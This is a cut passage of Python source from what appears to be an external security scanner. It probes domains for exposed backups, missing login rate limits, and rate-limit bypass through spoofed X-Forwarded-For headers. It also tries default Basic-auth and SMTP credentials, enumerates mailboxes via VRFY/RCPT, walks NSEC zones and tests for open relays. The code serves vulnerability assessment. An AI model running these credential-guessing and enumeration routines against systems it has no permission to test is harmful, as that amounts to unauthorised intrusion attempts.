                    if b"<!doctype html" in head or b"<html" in head:
                        continue               # rendered page, not a backup
                    if not any(m in body[:8000].lower() for m in BACKUP_MARK):
                        continue               # no code/config evidence
                    if bst == 200 and bbody and _body_similar(body, bbody):
                        continue               # same body the fake .bak returned
                    findings.append(
                        f"[BACKUP] {url} (200, {len(body)}B) source/config backup exposed")
                    hits += 1
    if hits:
        print(f"  [backup] -> {hits} backup file(s)", flush=True)
    return hits


async def ratelimit_check(probes, attrib, findings, cap_hosts=20, cap_paths=3,
                          tries=8):
    """burst forged credential POSTs at auth-like endpoints: all of them
       accepted (2xx/3xx/4xx client-error set) with no 429/423/Retry-After
       and no RateLimit-* headers => no rate limit. a random-path baseline
       drops catch-all / edge-auth servers."""
    host_paths = {}
    for h in sorted(probes):
        info = probes.get(h) or {}
        if not info.get("status"):
            continue
        cands = []
        for p, hs in attrib.items():
            if h not in hs:
                continue
            q = p.split("?")[0]
            if q not in cands and AUTH_LIKE_RX.search(q):
                cands.append(q)
        if not cands:
            rp = urlsplit(info.get("final_url") or "/").path or "/"
            if AUTH_LIKE_RX.search(rp):
                cands.append(rp)
        if cands:
            host_paths[h] = cands[:cap_paths]
    if not host_paths:
        print("  [ratelimit] no auth-like endpoints found", flush=True)
        return 0
    ok_sts = {200, 302, 303, 307, 400, 401, 403, 415, 422}
    rng = os.urandom(3).hex()
    ctype = {"Content-Type": "application/x-www-form-urlencoded"}
    hits = 0
    bypass = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        for h in sorted(host_paths)[:cap_hosts]:
            base = _burl(probes, h)
            bst, _, _ = await _grab(s, f"{base}/sxnrl-{rng}/login", timeout=6,
                                    method="POST",
                                    data=b"username=sxnr&password=Nope1!",
                                    headers=ctype)
            for p in host_paths[h]:
                stats, limited, rl_hdr = [], False, False
                for _ in range(tries):
                    st, body, hd = await _grab(
                        s, f"{base}{p}", timeout=6, method="POST",
                        data=f"username=sxnr{rng}&password=Nope1!".encode(),
                        headers=ctype)
                    if st is None:
                        break
                    stats.append(st)
                    kl = {k.lower() for k in hd}
                    if st in (429, 423) or "retry-after" in kl:
                        limited = True
                        break
                    if any(k.startswith("ratelimit") or k.startswith("x-ratelimit")
                           for k in kl):
                        rl_hdr = True          # limiter configured: absence of 429
                    await asyncio.sleep(0.03)  # within 8 tries means nothing
                if limited:
                    # control: this endpoint just returned 429/423. rotate
                    # X-Forwarded-For/X-Real-IP per request - if the limit
                    # never fires again the per-IP counter keys on
                    # client-set proxy headers
                    bl = 0
                    for i in range(tries):
                        xf = (f"10.{(i * 17) % 254 + 1}."
                              f"{(i * 31) % 254 + 1}.{(i * 7) % 254 + 1}")
                        st, _, hd = await _grab(
                            s, f"{base}{p}", timeout=6, method="POST",
                            data=f"username=sxnr{rng}&password=Nope1!".encode(),
                            headers={**ctype, "X-Forwarded-For": xf,
                                     "X-Real-IP": xf},
                            check_throttle=False)
                        if st is None:
                            break
                        kl = {k.lower() for k in hd}
                        if st in (429, 423) or "retry-after" in kl:
                            bl = 0
                            break              # limit still effective: no bypass
                        if st in ok_sts:
                            bl += 1
                        await asyncio.sleep(0.03)
                    if bl == tries:
                        bypass += 1
                        findings.append(
                            f"[RATELIMIT-BYPASS] {base}{p} returned 429/423 to "
                            f"plain requests but accepted {tries} rapid POSTs "
                            f"rotating X-Forwarded-For/X-Real-IP - the per-IP "
                            f"rate limit keys on client-set proxy headers")
                    continue
                if rl_hdr or len(stats) < tries:
                    continue
                if not all(st in ok_sts for st in stats):
                    continue
                if bst in ok_sts and all(st == bst for st in stats):
                    continue                   # catch-all/edge-auth, not an endpoint
                findings.append(
                    f"[RATELIMIT] {base}{p} accepted {tries} rapid credential POSTs "
                    f"(statuses {sorted(set(stats))}) - no rate limit on auth")
                hits += 1
    print(f"  [ratelimit] -> {hits} endpoint(s) without rate limiting", flush=True)
    if bypass:
        print(f"  [ratelimit] -> {bypass} rate limit(s) bypassed via "
              f"X-Forwarded-For rotation", flush=True)
    return hits


async def basic_auth_scan(probes, dir_rows, findings, cap_urls=40):
    """tiny default-cred set against Basic-auth 401 surfaces (root probe +
       discovered 401 paths) - 401 -> 200 with a real body = default creds;
       a random pair that also works means the auth accepts anything."""
    cands = []
    for h, info in sorted(probes.items()):
        acc = (info.get("headers") or {}).get("www-authenticate", "")
        if info.get("status") == 401 and "basic" in acc.lower():
            cands.append(_burl(probes, h) + "/")
    for row in dir_rows:
        parts = row.split("\t")
        if len(parts) == 4 and parts[1] == "401" and parts[0] in probes:
            cands.append(_burl(probes, parts[0]) + parts[3])
    cands = list(dict.fromkeys(cands))[:cap_urls]
    if not cands:
        print("  [basic-auth] no Basic-auth 401 surfaces", flush=True)
        return 0
    hits = 0
    rng = os.urandom(3).hex()
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        for url in cands:
            st, body, hd = await _grab(s, url, timeout=6, limit=200_000)
            www = hd.get("www-authenticate") or hd.get("WWW-Authenticate") or ""
            if st != 401 or "basic" not in www.lower():
                continue
            for user, pw in BASIC_CREDS:
                tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
                st2, body2, _ = await _grab(s, url, timeout=6, limit=200_000,
                                             headers={"Authorization": f"Basic {tok}"})
                # 40 (not 150): real login responses are often tiny JSON
                # ({"ok":true}); the similarity gate below is the real FP guard
                if (st2 == 200 and len(body2) >= 40
                        and not _body_similar(body2, body)):
                    rtok = base64.b64encode(
                        f"sxn{rng}:pw{rng}".encode()).decode()
                    st3, body3, _ = await _grab(s, url, timeout=6, limit=200_000,
                                                headers={"Authorization": f"Basic {rtok}"})
                    if st3 == 200 and len(body3) >= 40 and not _body_similar(body3, body):
                        findings.append(
                            f"[AUTH-DEFAULT] {url} accepts ANY Basic credentials "
                            f"(401 -> 200 for sxn{rng}) - auth not enforced")
                    else:
                        findings.append(
                            f"[AUTH-DEFAULT] {url} accepts default creds "
                            f"{user}:{pw} (401 -> 200, {len(body2)}B)")
                    hits += 1
                    break
    if hits:
        print(f"  [basic-auth] -> {hits} weak credential hit(s)", flush=True)
    else:
        print("  [basic-auth] no default creds worked", flush=True)
    return hits


# ---------------- phase 17: TLS config scan ----------------
_WEAK_SIG_OIDS = (bytes.fromhex("06092A864886F70D010104"),   # md5WithRSAEncryption
                  bytes.fromhex("06092A864886F70D010105"),   # sha1WithRSAEncryption
                  bytes.fromhex("06072A8648CE3D0401"),       # ecdsa-with-SHA1
                  bytes.fromhex("06072A864885F80403"))       # dsaWithSHA1


def _der_len(b, j):
    if b[j] & 0x80:
        n = b[j] & 0x7F
        j += 1
        return int.from_bytes(b[j:j + n], "big"), j + n
    return b[j], j + 1


def _der_rsa_bits(der):
    oid = bytes.fromhex("2A864886F70D010101")     # rsaEncryption
    i = der.find(oid)
    if i < 0:
        return None
    j = i + len(oid)
    try:
        if der[j:j + 2] == b"\x05\x00":
            j += 2
        if der[j] != 0x03:                        # BIT STRING (public key)
            return None
        _, j = _der_len(der, j + 1)
        j += 1                                    # unused-bits byte
        if der[j] != 0x30:                        # SEQUENCE {modulus, exp}
            return None
        _, j = _der_len(der, j + 1)
        if der[j] != 0x02:                        # INTEGER modulus
            return None
        ln, j = _der_len(der, j + 1)
        mod = der[j:j + ln]
        if mod and mod[0] == 0:
            mod = mod[1:]
        return len(mod) * 8 if mod else None
    except Exception:
        return None


def _tls_conn(ctx, host, timeout=5.0):
    with socket.create_connection((host, 443), timeout=timeout) as sock:
        sock.settimeout(timeout)
        with ctx.wrap_socket(sock, server_hostname=host) as s:
            return s.version(), (s.cipher() or (None,))[0], \
                s.getpeercert(binary_form=True)


def _client_ctx(minv=None, maxv=None, ciphers=None):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if minv is not None:
        ctx.minimum_version = minv
    if maxv is not None:
        ctx.maximum_version = maxv
    if ciphers:
        ctx.set_ciphers(ciphers)
    return ctx


def _tls_host_checks(host):
    out = []
    try:
        _, _, der = _tls_conn(_client_ctx(), host)
    except Exception:
        return out
    if der:
        bits = _der_rsa_bits(der)
        if bits and bits < 2048:
            out.append(f"[TLS-SMALLKEY] {host}:443 RSA key {bits} bits (<2048)")
        for oid in _WEAK_SIG_OIDS:
            if oid in der:
                out.append(f"[WEAKSIG] {host}:443 cert signed with MD5/SHA1")
                break
    for tag, ver in (("TLS10", ssl.TLSVersion.TLSv1),
                     ("TLS11", ssl.TLSVersion.TLSv1_1)):
        for cs in ("ALL:@SECLEVEL=0", None):
            try:
                _tls_conn(_client_ctx(minv=ver, maxv=ver, ciphers=cs), host)
                out.append(f"[{tag}] {host}:443 accepts {ver.name}")
                break
            except (ValueError, ssl.SSLError):
                continue
            except Exception:
                break
    weak = ("RC4-MD5:RC4-SHA:DES-CBC3-SHA:EXP-RC4-MD5:EXP-DES-CBC3-SHA:"
            "@SECLEVEL=0",
            "eNULL:@SECLEVEL=0")
    for cs in weak:
        try:
            ctx = _client_ctx(minv=ssl.TLSVersion.TLSv1,
                              maxv=ssl.TLSVersion.TLSv1_2, ciphers=cs)
        except (ValueError, ssl.SSLError):
            continue
        try:
            _, cipher, _ = _tls_conn(ctx, host)
            if cipher:
                out.append(f"[WEAKCIPHER] {host}:443 negotiated {cipher}")
                break
        except Exception:
            pass
    for cs in ("AES128-SHA", "AES256-SHA"):
        try:
            ctx = _client_ctx(minv=ssl.TLSVersion.TLSv1,
                              maxv=ssl.TLSVersion.TLSv1_2,
                              ciphers=cs + ":@SECLEVEL=0")
        except (ValueError, ssl.SSLError):
            continue
        try:
            _tls_conn(ctx, host)
            out.append(f"[TLS-RSAKEX] {host}:443 accepts static-RSA key "
                       f"exchange ({cs})")
            break
        except Exception:
            pass
    return out


def enum_mailboxes(domains, surf, per_host=4):
    """harvested per-host emails -> {domain: [local-part, ...]} limited to the
    scan targets (mailboxes for other domains are never probed)."""
    tgt = {}
    for d in domains:
        tgt.setdefault(str(d).lower(), d)
    out = {}
    for _host, rec in (surf or {}).items():
        for e in (rec.get("emails") or {}):
            e = str(e).strip().lower()
            if "@" not in e:
                continue
            local, _, ed = e.partition("@")
            dom = tgt.get(ed)
            if not dom or not local:
                continue
            got = out.setdefault(dom, [])
            if local not in got and len(got) < per_host:
                got.append(local)
    return out


async def _mx_hosts(d):
    """MX exchanges for d, lowest preference first (empty on none/NXDOMAIN)."""
    try:
        ans = await dns.asyncresolver.resolve(d, "MX")
        out = []
        for r in ans:
            ex = str(r.exchange).rstrip(".")
            if ex:
                out.append((int(r.preference), ex))
        return [h for _, h in sorted(out)]
    except Exception:
        return []


async def _mta_sts_policy_check(d, findings, sess, timeout=8):
    """fetch the MTA-STS policy file for a domain whose TXT is already a
    valid v=STSv1 policy: unreachable (any status / error) or `mode:` other
    than enforce -> MTA-STS-FILE; enforce -> no finding (no-FP guard).
    returns findings added."""
    n0 = len(findings)
    url = f"https://mta-sts.{d}/.well-known/mta-sts.txt"
    st, body = None, b""
    try:
        async with HTTP_SEM:
            async with sess.get(url, headers=UA,
                                timeout=aiohttp.ClientTimeout(total=timeout),
                                ssl=ssl.create_default_context(),
                                allow_redirects=False) as r:
                st = r.status
                body = await r.content.read(8192)
    except Exception:
        st = None
    if st != 200 or not body:
        findings.append(
            f"[MTA-STS-FILE] {d} publishes a v=STSv1 TXT but the policy "
            f"file {url} is unreachable ({st or 'error'}) - policy not "
            f"enforceable")
        return len(findings) - n0
    m = re.search(rb"(?im)^\s*mode\s*:\s*(\w+)", body)
    mode = m.group(1).decode("utf-8", "ignore").lower() if m else ""
    if mode != "enforce":
        findings.append(
            f"[MTA-STS-FILE] {d} policy at {url} has mode: "
            f"{mode or 'missing'} (not enforce) - TLS downgrade still "
            f"allowed while the policy is in testing")
    return len(findings) - n0


async def dns_hardening_checks(domains, findings, cap=50):
    """passive DNS hardening gaps: CAA + MTA-STS (TXT and policy file) +
    DNSSEC delegation.

    CAA-MISSING: apex answers with no CAA record, or CAA records that
    contain no non-empty issue/issuewild value -> any CA may issue a cert
    for it (cert hijack surface). MTA-STS-MISSING: domain has MX but no
    valid `_mta-sts` TXT policy (v=STSv1) -> SMTP TLS downgrades are
    unprotected. MTA-STS-FILE: valid TXT but the policy file at
    mta-sts.<domain> is unreachable or not mode: enforce. DNSSEC-MISSING:
    definitive NoAnswer on the parent DS query -> unsigned zone.
    NXDOMAIN / timeout / SERVFAIL produce NO finding: unknown != absent.
    returns findings added."""
    if not HAVE_DNSPY:
        print("  [dns-hardening] dnspython unavailable - skipped", flush=True)
        return 0
    n0 = len(findings)
    conn = aiohttp.TCPConnector(limit=4, ssl=False)
    async with xsession(conn) as sts_sess:
        for d in domains[:cap]:
            d = str(d).lower().strip(".")
            if not d or "." not in d or "*" in d or "/" in d:
                continue
            try:
                ans = await dns.asyncresolver.resolve(d, "CAA", lifetime=5)
                issues, others = [], []
                try:
                    for rr in ans:
                        for rd in rr:
                            tag = getattr(rd, "tag", "")
                            if isinstance(tag, bytes):
                                tag = tag.decode("utf-8", "ignore")
                            tag = str(tag).lower()
                            val = getattr(rd, "value", b"")
                            if isinstance(val, bytes):
                                val = val.decode("utf-8", "ignore")
                            if tag in ("issue", "issuewild"):
                                issues.append(str(val).strip())
                            else:
                                others.append(tag or "unknown")
                except Exception:
                    issues = ["(present)"]  # unparsable -> presence only
                if issues and not any(issues):
                    findings.append(
                        f"[CAA-MISSING] {d} CAA issue record is empty - any "
                        f"CA may still issue certificates for it")
                elif not issues:
                    findings.append(
                        f"[CAA-MISSING] {d} publishes CAA but no "
                        f"issue/issuewild restriction "
                        f"({', '.join(sorted(set(others)) or ['no tags'])}) "
                        f"- any CA may issue certificates")
            except dns.resolver.NoAnswer:
                findings.append(
                    f"[CAA-MISSING] {d} publishes no CAA record - any CA may "
                    f"issue certificates for it")
            except dns.exception.DNSException:
                pass                    # timeout / SERVFAIL -> unknown
            # DNSSEC: a DS record at the parent is the delegation proof -
            # definitively absent (NoAnswer) means answers are forgeable
            try:
                await dns.asyncresolver.resolve(d, "DS", lifetime=5)
            except dns.resolver.NoAnswer:
                findings.append(
                    f"[DNSSEC-MISSING] {d} has no DS delegation in the parent "
                    f"zone - the zone is unsigned, DNS answers are forgeable")
            except dns.exception.DNSException:
                pass                    # timeout / SERVFAIL / NXDOMAIN
            mx = await _mx_hosts(d)
            if not mx:
                continue                # not a mail domain -> N/A
            vals = []
            try:
                ans = await dns.asyncresolver.resolve(f"_mta-sts.{d}", "TXT",
                                                      lifetime=5)
                for txt in ans:
                    vals.append(b"".join(s for s in
                                         getattr(txt, "strings", ()))
                                .decode("utf-8", "ignore"))
            except dns.resolver.NoAnswer:
                vals = []               # record absent
            except dns.exception.DNSException:
                continue                # unknown -> no finding
            if any(v.startswith("v=STSv1") for v in vals):
                try:
                    await _mta_sts_policy_check(d, findings, sts_sess)
                except Exception:
                    pass                # reports its own failures
                continue                # TXT itself valid
            if vals:
                findings.append(
                    f"[MTA-STS-MISSING] {d} has MX ({mx[0]}) but its _mta-sts TXT "
                    f"is not a valid policy: {vals[0][:60]!r}")
            else:
                findings.append(
                    f"[MTA-STS-MISSING] {d} has MX ({mx[0]}) but no _mta-sts TXT "
                    f"policy - SMTP TLS downgrades unprotected")
    return len(findings) - n0


def _nsec_walk_sync(domain, server, max_steps=25):
    """follow NSEC `next` pointers from the NXDOMAIN covering record ->
    ordered list of zone names (the walk). returns [] for unsigned /
    NSEC3-signed / unreachable zones. blocking (dns.query) - call via
    asyncio.to_thread."""
    def query(name):
        q = dns.message.make_query(name, dns.rdatatype.NSEC,
                                   want_dnssec=True)
        r = dns.query.udp(q, server, timeout=4)
        if r.flags & dns.flags.TC:
            r = dns.query.tcp(q, server, timeout=4)
        return r

    def nsec_rrs(resp):
        out = []
        for sec in (resp.answer, resp.authority):
            for rr in sec:
                if rr.rdtype == dns.rdatatype.NSEC:
                    for rd in rr:
                        out.append((rr.name, rd.next))
        return out

    try:
        rrs = nsec_rrs(query(f"_sxe-nsec.{domain}"))
    except Exception:
        return []
    if not rrs:
        return []                        # unsigned or NSEC3 (hashed)
    lbl = "." + domain
    seen, names = set(), []
    nxt = str(rrs[0][1]).rstrip(".")
    for _ in range(max_steps):
        if not nxt or nxt in seen:
            break
        seen.add(nxt)
        if not (nxt == domain or nxt.endswith(lbl)):
            break                        # pointer left the zone -> stop
        if nxt == domain:
            break                        # wrapped to apex - walk complete
        names.append(nxt)
        try:
            resp = query(nxt)
        except Exception:
            break
        exact = [(o, nx) for o, nx in nsec_rrs(resp)
                 if str(o).rstrip(".") == nxt]
        if not exact:
            break                        # no exact entry -> not walkable
        nxt = str(exact[0][1]).rstrip(".")
    return names


async def _ns_ip(d):
    """authoritative NS IPv4 for d (first that resolves), else system."""
    try:
        ans = await dns.asyncresolver.resolve(d, "NS", lifetime=5)
        nss = [str(r.target).rstrip(".") for r in ans][:3]
    except Exception:
        nss = []
    for cand in nss:
        try:
            a = await dns.asyncresolver.resolve(cand, "A", lifetime=5)
            return str(a[0].address), cand
        except Exception:
            continue
    try:
        r = dns.resolver.Resolver()
        if r.nameservers:
            return str(r.nameservers[0]), "system-resolver"
    except Exception:
        pass
    return None, None


async def nsec_zone_walk(domains, findings, cap_domains=20, max_steps=25):
    """DNSSEC NSEC zone-walk: unauthenticated zone enumeration.

    NSEC-signed zones publish every name in order - querying a nonexistent
    label returns the covering NSEC whose `next` field is the next zone
    entry; following it walks the zone. NSEC3 (hashed) resists this.
    reports NSEC-WALK only after >=3 linked names all inside the target
    zone (one covering NSEC on NXDOMAIN is normal, not a walk); any
    timeout/refusal/out-of-zone pointer -> no finding. returns count."""
    n0 = len(findings)
    doms = []
    for d in domains[:cap_domains]:
        d = str(d).lower().strip(".")
        if d and "." in d and "*" not in d and "/" not in d:
            doms.append(d)
    if not doms:
        return 0
    walkable = 0

    async def one(d):
        nonlocal walkable
        try:
            server, _via = await _ns_ip(d)
            if not server:
                return
            names = await asyncio.to_thread(_nsec_walk_sync, d, server,
                                            max_steps)
            if len(names) >= 3:
                walkable += 1
                findings.append(
                    f"[NSEC-WALK] {d} zone is NSEC-signed - unauthenticated "
                    f"zone walk enumerated {len(names)} name(s) "
                    f"(e.g. {', '.join(names[:3])}) - switch to NSEC3/"
                    f"white-lies to stop this")
        except Exception:
            return
    await asyncio.gather(*[one(d) for d in doms])
    if doms:
        print(f"  [nsec] {len(doms)} zone(s) tried, "
              f"{walkable} walkable", flush=True)
    return len(findings) - n0


async def _smtp_reply(reader, timeout=6.0):
    """multiline SMTP reply -> (code, text); 0 on EOF / non-numeric line."""
    line = await asyncio.wait_for(reader.readline(), timeout)
    if not line:
        return 0, ""
    try:
        code = int(line[:3])
    except ValueError:
        return 0, line.decode("latin-1", "replace").strip()
    text = line.decode("latin-1", "replace").strip()
    nlines = 1
    while len(line) > 3 and line[3:4] == b"-" and nlines < 64:
        line = await asyncio.wait_for(reader.readline(), timeout)
        if not line:
            break
        text += " | " + line.decode("latin-1", "replace").strip()
        nlines += 1
    return code, text


def _smtp_ok(code):
    return 200 <= code < 300


async def _smtp_oracle(host, domain, mbox, findings, port=25, timeout=6.0):
    """one SMTP session: VRFY (then RCPT) control-vs-candidate differential.

    evidence rule - a finding needs a NON-accepted control mailbox and at
    least one ACCEPTED harvested mailbox; uniform accept (252-to-all) or
    uniform reject means no oracle and no finding (no-FP guard).
    returns 1 when a finding was appended."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), min(timeout, 8.0))
    except Exception:
        return 0
    found = 0
    try:
        code, _ = await _smtp_reply(reader, timeout)
        if code != 220:
            return 0
        writer.write(b"EHLO subenum.local\r\n")
        await writer.drain()
        code, _ = await _smtp_reply(reader, timeout)
        if code == 0:
            return 0
        ctrl = "sxe-u4" + os.urandom(4).hex() + "@" + domain
        # only RFC-ish local-parts: an invalid harvested name gets rejected
        # for SYNTAX, which would fake a "control rejected" differential
        cand = [m for m in mbox
                if re.fullmatch(r"[\w.+\-]{1,64}", str(m) or "")]
        if not cand:
            return 0
        hits = []

        async def probe(cmd):
            writer.write((cmd + "\r\n").encode())
            await writer.drain()
            return await _smtp_reply(reader, timeout)

        vc, _ = await probe("VRFY " + ctrl)
        if vc == 0:
            return 0
        if not _smtp_ok(vc):            # control rejected -> differential possible
            for m in cand:
                c, t = await probe(f"VRFY {m}@{domain}")
                if _smtp_ok(c):
                    hits.append(("VRFY", m, t))
        if not hits:                    # VRFY uniform or unsupported -> RCPT oracle
            mc, _ = await probe(f"MAIL FROM:<probe@{domain}>")
            if _smtp_ok(mc):
                rc, _ = await probe(f"RCPT TO:<{ctrl}>")
                if rc and not _smtp_ok(rc):
                    for m in cand:
                        c, t = await probe(f"RCPT TO:<{m}@{domain}>")
                        if _smtp_ok(c):
                            hits.append(("RCPT", m, t))
        if hits:
            how, _who, reply = hits[0]
            names = ", ".join(sorted({m for _, m, _ in hits}))
            findings.append(
                f"[USER-ENUM] {host} SMTP {how} oracle confirms "
                f"{len({m for _, m, _ in hits})}/{len(mbox)} mailbox(es) "
                f"on {domain}: {names} "
                f"(control sxe-u4* rejected; reply: {reply[:70]})")
            found = 1
    except Exception:
        pass
    finally:
        try:
            writer.close()
        except Exception:
            pass
    return found


async def smtp_default_check(mx, d, findings, timeout=8.0, port=25):
    """separate session per attempt batch: EHLO advertises AUTH -> a random
    control pair must be REJECTED (differential) -> a default pair landing
    2xx on AUTH LOGIN = SMTP-DEFAULT. never runs inside the relay session so
    the relay verdict stays 'no AUTH issued'."""
    n0 = len(findings)
    pairs = (("admin", "admin"), ("admin", "password"), ("mail", "mail"),
             ("smtp", "smtp"), ("test", "test"), ("user", "user"),
             ("postmaster", "postmaster"), ("info", "info"))
    import base64 as _b64

    async def open_sess():
        try:
            rd, wr = await asyncio.wait_for(
                asyncio.open_connection(mx, port), min(timeout, 8.0))
        except Exception:
            return None, None
        try:
            code, _ = await _smtp_reply(rd, timeout)
            if code != 220:
                raise RuntimeError("no banner")
            wr.write(b"EHLO subenum.local\r\n")
            await wr.drain()
            code, ehlo = await _smtp_reply(rd, timeout)
            if not _smtp_ok(code) or "auth" not in (ehlo or "").lower():
                raise RuntimeError("no AUTH capability")
            return rd, wr
        except Exception:
            try:
                wr.close()
            except Exception:
                pass
            return None, None

    async def attempt(rd, wr, user, pw):
        """-> ("accept"|"reject"|"dead", code, reply text)"""
        for blob in (b"AUTH LOGIN\r\n",
                     _b64.b64encode(user.encode()) + b"\r\n",
                     _b64.b64encode(pw.encode()) + b"\r\n"):
            wr.write(blob)
            await wr.drain()
            c, t = await _smtp_reply(rd, timeout)
            if not c:
                return "dead", 0, t
            if c >= 400 and blob != b"AUTH LOGIN\r\n":
                return "reject", c, t          # 535 bad login -> session usable
            if c >= 400 and blob == b"AUTH LOGIN\r\n":
                return "dead", c, t            # AUTH disabled after EHLO
            if 200 <= c < 300 and blob == _b64.b64encode(pw.encode()) + b"\r\n":
                return "accept", c, t
            if c not in (334, 335):
                return "dead", c, t
        return "dead", 0, ""

    rd, wr = await open_sess()
    if rd is None:
        return 0
    try:
        ctrl_u, ctrl_p = ("sxe" + os.urandom(4).hex(),
                          "sXe!9p" + os.urandom(3).hex())
        res, code, _ = await attempt(rd, wr, ctrl_u, ctrl_p)
        if res == "accept":
            return 0                      # accepts ANY login -> not a default
        if res == "dead":
            try:
                wr.close()
            except Exception:
                pass
            rd, wr = await open_sess()
            if rd is None:
                return 0
        for u, pw in pairs:
            res, code, _ = await attempt(rd, wr, u, pw)
            if res == "accept":
                findings.append(
                    f"[SMTP-DEFAULT] {mx} accepts AUTH LOGIN with the "
                    f"default credentials {u}:{pw} (control random pair "
                    f"rejected; server replied {code}) - authenticated "
                    f"session on the mail server")
                try:
                    wr.close()
                except Exception:
                    pass
                return 1
            if res == "dead":
                try:
                    wr.close()
                except Exception:
                    pass
                rd, wr = await open_sess()
                if rd is None:
                    return 0
        return 0
    finally:
        try:
            if wr is not None:
                wr.close()
        except Exception:
            pass
    return len(findings) - n0


async def smtp_checks(domains, findings, cap_domains=10, timeout=8.0, port=25):
    """active MX checks (one session per exchanger): open relay + STARTTLS.

    SMTP-RELAY evidence: with NO AUTH issued and an OWN-DOMAIN sender
    accepted (MAIL FROM:<...@domain> 250), the own-domain control RCPT
    (postmaster@domain) is accepted (250) AND an external RCPT is accepted
    (250) -> the server relays third-party mail. The same acceptance during
    a null-sender (MAIL FROM:<>) session - which many servers allow for
    bounces - is reported as SMTP-NULL-RELAY (medium) instead: DSN spoofing
    surface, not "anyone can send as your domain".
    A rejected external RCPT, a rejected control, or session errors produce
    no finding (no-FP guard).
    SMTP-TLS evidence: EHLO without STARTTLS, STARTTLS advertised but the
    upgrade/handshake fails, or post-TLS EHLO fails. RSET/QUIT only, never
    DATA - no message is ever sent. returns findings added."""
    n0 = len(findings)
    doms = []
    for d in (domains or [])[:cap_domains]:
        d = str(d).lower().strip(".")
        if d and "." in d and "*" not in d and "/" not in d:
            doms.append(d)
    sem = asyncio.Semaphore(3)

    async def one(d):
        try:
            mxs = await _mx_hosts(d)
        except Exception:
            return
        if not mxs:
            return
        async with sem:
            # primary, then backup when the primary never starts a session
            for mx in mxs[:2]:
                await smtp_default_check(mx, d, findings, timeout, port)
                if await _mx_relay_tls(mx, d, findings, timeout, port) is not None:
                    break

    await asyncio.gather(*[one(d) for d in doms])
    return len(findings) - n0


async def _mx_relay_tls(mx, d, findings, timeout, port):
    """one SMTP session on mx: STARTTLS presence/health + unauthenticated
    relay test. returns None when no session ever started (caller may try
    the next exchanger), else the findings count added."""
    n0 = len(findings)
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(mx, port), min(timeout, 8.0))
    except Exception:
        return None
    try:
        code, _ = await _smtp_reply(reader, timeout)
        if code != 220:
            return None
        writer.write(b"EHLO subenum.local\r\n")
        await writer.drain()
        code, ehlo = await _smtp_reply(reader, timeout)
        if not _smtp_ok(code) or not ehlo:
            return None
        low = ehlo.lower()
        relay_ready = True
        if "starttls" not in low:
            findings.append(
                f"[SMTP-TLS] {mx} ({d}) does not offer STARTTLS "
                f"(EHLO: {ehlo[:70]}) - mail in transit is plaintext")
        else:
            writer.write(b"STARTTLS\r\n")
            await writer.drain()
            code, _ = await _smtp_reply(reader, timeout)
            if code != 220:
                findings.append(
                    f"[SMTP-TLS] {mx} ({d}) advertises STARTTLS but replied "
                    f"{code} to the command - broken/strippable upgrade")
            else:
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    await writer.start_tls(
                        ctx, server_hostname=mx,
                        ssl_handshake_timeout=min(timeout, 10.0))
                except Exception as e:
                    findings.append(
                        f"[SMTP-TLS] {mx} ({d}) advertises STARTTLS but the "
                        f"TLS handshake failed ({type(e).__name__}) - "
                        f"stripping/broken")
                    return len(findings) - n0
                writer.write(b"EHLO subenum.local\r\n")
                await writer.drain()
                code, _ = await _smtp_reply(reader, timeout)
                if not _smtp_ok(code):
                    findings.append(
                        f"[SMTP-TLS] {mx} ({d}) completes the TLS handshake "
                        f"but the post-TLS EHLO failed (code {code}) - "
                        f"broken after upgrade")
                    relay_ready = False
        if relay_ready:
            mail = f"MAIL FROM:<sxe-rly@{d}>"
            writer.write((mail + "\r\n").encode())
            await writer.drain()
            code, _ = await _smtp_reply(reader, timeout)
            if code != 250:
                mail = "MAIL FROM:<>"
                writer.write((mail + "\r\n").encode())
                await writer.drain()
                code, _ = await _smtp_reply(reader, timeout)
                if code == 250:
                    mail = "MAIL FROM:<>"
            if code == 250:
                writer.write(f"RCPT TO:<postmaster@{d}>\r\n".encode())
                await writer.drain()
                c_own, _ = await _smtp_reply(reader, timeout)
                writer.write(b"RSET\r\n")
                await writer.drain()
                await _smtp_reply(reader, timeout)
                if c_own == 250:
                    writer.write((mail + "\r\n").encode())
                    await writer.drain()
                    code, _ = await _smtp_reply(reader, timeout)
                    if code == 250:
                        writer.write(b"RCPT TO:<sxe-rly-probe@example.org>\r\n")
                        await writer.drain()
                        c_ext, _ = await _smtp_reply(reader, timeout)
                        writer.write(b"RSET\r\n")
                        await writer.drain()
                        await _smtp_reply(reader, timeout)
                        if c_ext == 250:
                            if mail == "MAIL FROM:<>":
                                # null-sender sessions are routinely allowed
                                # for bounces - relay acceptance here is a
                                # DSN-spoofing surface, not a full relay
                                findings.append(
                                    f"[SMTP-NULL-RELAY] {mx} ({d}) accepts an "
                                    f"unauthenticated external RCPT during a "
                                    f"null-sender (MAIL FROM:<>) session - "
                                    f"bounce/DSN spoofing relay")
                            else:
                                findings.append(
                                    f"[SMTP-RELAY] {mx} ({d}) accepts an "
                                    f"unauthenticated RCPT to an external "
                                    f"address (250) while the own-domain "
                                    f"MAIL FROM and control RCPT for {d} are "
                                    f"also accepted - open relay, anyone can "
                                    f"send mail as your domain")
    except Exception:
        pass
    finally:
        try:
            writer.write(b"QUIT\r\n")
            await writer.drain()
        except Exception:
            pass
        try:
            writer.close()
        except Exception:
            pass
    return len(findings) - n0


async def user_enum(domains, findings, surf, cap_domains=5, per_host=4,
                    deadline=45.0, port=25):
    """phase 16-18: SMTP VRFY/RCPT mailbox enumeration (response oracle)."""
    n0 = len(findings)
    boxes = enum_mailboxes(domains, surf, per_host)
    if not boxes:
        return 0
    print(f"      user-enum: {len(boxes)} domain(s) with harvested mailboxes",
          flush=True)
    t_end = time.time() + deadline
    done = 0
    for d in domains:
        if done >= cap_domains or time.time() > t_end:
            break
        mbox = boxes.get(d)
        if not mbox:
            continue
        mxs = await _mx_hosts(d)
        if not mxs:
            continue
        done += 1
        for mx in mxs[:2]:              # primary, then backup if primary fails
            if await _smtp_oracle(mx, d, mbox, findings, port=port):
